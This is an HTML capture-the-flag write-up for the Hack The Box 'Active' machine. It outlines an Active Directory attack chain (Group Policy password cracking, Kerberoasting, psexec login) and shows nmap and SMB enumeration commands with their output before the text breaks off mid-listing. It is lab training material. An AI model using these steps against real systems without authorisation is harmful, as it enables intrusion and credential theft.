<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>hackthebox Active</strong></h1>
        <em>Released: July 28th 2018 / Pwned: November 4th 2019 - [+] Solved whilst Retired</em><br>
        <br>
        <img alt="images\2-1.png" src="images/2-1.png"><br>
        <br>
        As the name implies, Active is all about Active Directory.<br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h4><strong>Summary</strong></h4>
        • Crack a Group Policy password found in a <code>Groups.xml</code> in the <code>Replication</code> share<br>
        • Move to Active Directory and retrieve a list of users on the target with <code>GetADUsers.py</code><br>
        • Retrieve Administrators's password hash via a TGS request run by <code>GetUserSPNs.py</code><br>
        • Crack Administrator's password hash with <code>john</code><br>
        • Log in to the target as Administrator with <code>psexec.py</code><br>
        <br>
        <a id="h3-2" name="h3-2"></a><strong></strong>
        <h4><strong>Tools used</strong></h4>
        • <code>smbmap</code><br>
        • <code>gpp-decrypt</code><br>
        • <code>ldapsearch</code><br>
        • <code>GetADUsers.py</code><br>
        • <code>GetUserSPNs.py</code><br>
        • <code>john</code><br>
        • <code>psexec.py</code><br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Nmap</strong></h2><br>
        Initial TCP all-ports scan:<br>
        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.100</code><br>
        <br>
        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
        <code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.100</code><br>
        <br>
        -sV service enumeration<br>
        -sC default scripts<br>
        -O OS detection<br>
        -oN default output<br>
        <br>
        Results:<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.100</span><br>
                Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-11-01&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>21&nbsp;GMT<br>
                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.100<br>
                Host&nbsp;is&nbsp;up&nbsp;(0.12s&nbsp;latency).<br>
                Not&nbsp;shown:&nbsp;65512&nbsp;closed&nbsp;ports<br>
                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
                53/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;domain<br>
                88/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;kerberos-sec<br>
                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc<br>
                139/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn<br>
                389/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ldap<br>
                445/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds<br>
                464/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;kpasswd5<br>
                593/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http-rpc-epmap<br>
                636/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ldapssl<br>
                3268/tcp&nbsp;&nbsp;open&nbsp;&nbsp;globalcatLDAP<br>
                3269/tcp&nbsp;&nbsp;open&nbsp;&nbsp;globalcatLDAPssl<br>
                5722/tcp&nbsp;&nbsp;open&nbsp;&nbsp;msdfsr<br>
                9389/tcp&nbsp;&nbsp;open&nbsp;&nbsp;adws<br>
                47001/tcp&nbsp;open&nbsp;&nbsp;winrm<br>
                49152/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49153/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49154/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49155/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49157/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49158/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49169/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49171/tcp&nbsp;open&nbsp;&nbsp;unknown<br>
                49182/tcp&nbsp;open&nbsp;&nbsp;unknown
            </div>
        </div><br>
        <br>
        Lots of results.<br>
        <code>grep</code> the Nmap output for open ports, and run service detection and default scripts against those open ports.<br>
        <br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#grep&nbsp;^[0-9]&nbsp;nmap/tcp-all.txt&nbsp;|&nbsp;cut&nbsp;-d&nbsp;'/'&nbsp;-f&nbsp;1&nbsp;|&nbsp;tr&nbsp;'\n'&nbsp;','&nbsp;|&nbsp;sed&nbsp;s/,$//&nbsp;&gt;&nbsp;nmap/tcp-portlist.txt</span><br>
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;nmap/tcp-portlist.txt&nbsp;</span><br>
                53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49182
            </div>
        </div><br>
        <br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;$(cat&nbsp;nmap/tcp-portlist.txt)&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.100</span><br>
                Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-11-01&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>29&nbsp;GMT<br>
                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.100<br>
                Host&nbsp;is&nbsp;up&nbsp;(0.11s&nbsp;latency).<br>
                <br>
                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
                53/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;DNS&nbsp;6.1.7601&nbsp;(1DB15D39)&nbsp;(Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;SP1)<br>
                |&nbsp;dns-nsid:&nbsp;<br>
                |_&nbsp;&nbsp;bind.version:&nbsp;Microsoft&nbsp;DNS&nbsp;6.1.7601&nbsp;(1DB15D39)<br>
                88/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;kerberos-sec&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Kerberos&nbsp;(server&nbsp;time:&nbsp;2019-11-01&nbsp;15:29:21Z)<br>
                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                139/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
                389/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ldap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Active&nbsp;Directory&nbsp;LDAP&nbsp;(Domain:&nbsp;active.htb,&nbsp;Site:&nbsp;Default-First-Site-Name)<br>
                445/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds?<br>
                464/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;kpasswd5?<br>
                593/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ncacn_http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC&nbsp;over&nbsp;HTTP&nbsp;1.0<br>
                636/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;tcpwrapped<br>
                3268/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ldap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Active&nbsp;Directory&nbsp;LDAP&nbsp;(Domain:&nbsp;active.htb,&nbsp;Site:&nbsp;Default-First-Site-Name)<br>
                3269/tcp&nbsp;&nbsp;open&nbsp;&nbsp;tcpwrapped<br>
                5722/tcp&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                9389/tcp&nbsp;&nbsp;open&nbsp;&nbsp;mc-nmf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.NET&nbsp;Message&nbsp;Framing<br>
                47001/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;(SSDP/UPnP)<br>
                |_http-server-header:&nbsp;Microsoft-HTTPAPI/2.0<br>
                |_http-title:&nbsp;Not&nbsp;Found<br>
                49152/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49153/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49154/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49155/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49157/tcp&nbsp;open&nbsp;&nbsp;ncacn_http&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC&nbsp;over&nbsp;HTTP&nbsp;1.0<br>
                49158/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49169/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49171/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                49182/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;SP1&nbsp;(96%)<br>
                [...]
            </div>
        </div><br>
        <br>
        In situations like this, where there a lots of open ports, you should pick out the key ports which are likely to net you the most useful information the quickest, and start there.<br>
        <br>
        From these results, the ports you should most likely be looking at are:<br>
        • <code>139/smb</code> - Anonymous access to a share might be enabled<br>
        • <code>389/ldap</code> - Might be ablet to gather information from Active Directory<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) 139/smb</strong></h2><br>
        List the available shares on the target with <code>smbclient -L</code>.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbclient&nbsp;-L&nbsp;//10.10.10.100</span><br>
                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
                Anonymous&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;successful<br>
                <br>
                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
                ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;Admin<br>
                C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default&nbsp;share<br>
                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;IPC<br>
                NETLOGON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon&nbsp;server&nbsp;share&nbsp;<br>
                Replication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                SYSVOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logon&nbsp;server&nbsp;share&nbsp;<br>
                Users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">workgroup</span>&nbsp;listing.<br>
                do_connect:&nbsp;Connection&nbsp;to&nbsp;10.10.10.100&nbsp;failed&nbsp;(Error&nbsp;NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>
                Failed&nbsp;to&nbsp;connect&nbsp;with&nbsp;SMB1&nbsp;--&nbsp;no&nbsp;workgroup&nbsp;available
            </div>
        </div><br>
        <br>
        To save yourself the effort of checking whether you have access to any of these shares manually, you can use <code>smbmap</code>.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbmap&nbsp;-H&nbsp;10.10.10.100</span><br>
                [+]&nbsp;Finding&nbsp;open&nbsp;SMB&nbsp;ports....<br>
                [+]&nbsp;User&nbsp;SMB&nbsp;session&nbsp;establishd&nbsp;on&nbsp;10.10.10.100...<br>
                [+]&nbsp;IP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.100<span style="color:#ff9d00;font-weight:700">:</span>445 Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;active.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions<br>
                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------<br>
                ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
                C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
                NETLOGON&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
                Replication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; READ&nbsp;ONLY<br>
                SYSVOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
                Users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS
            </div>
        </div><br>
        <br>
        Great! We have read access on <code>Replication</code>.<br>
        <br>
        <a id="h3-3" name="h3-3"></a><strong></strong>
        <h3><strong>2a) Replication share</strong></h3><br>
        Connect to the <code>Replication</code> share with <code>smbclient</code>.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>active]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbclient&nbsp;//10.10.10.100/Replication</span><br>
                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
                Anonymous&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;successful<br>
                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;active.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018
            </div>
        </div><br>
        <br>
        I turned on recusive listing with <code>recurse ON</code> so that I could view all the files in the share with 1 command.<br>
            <div class="codebox">
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;recurse&nbsp;ON<br>
                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                &nbsp;&nbsp;active.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sat&nbsp;Jul&nbsp;21&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>44&nbsp;2018<br>
                <br>
                <span style="color:#333333;font-weight:400">\a</span>ctive.htb<br>
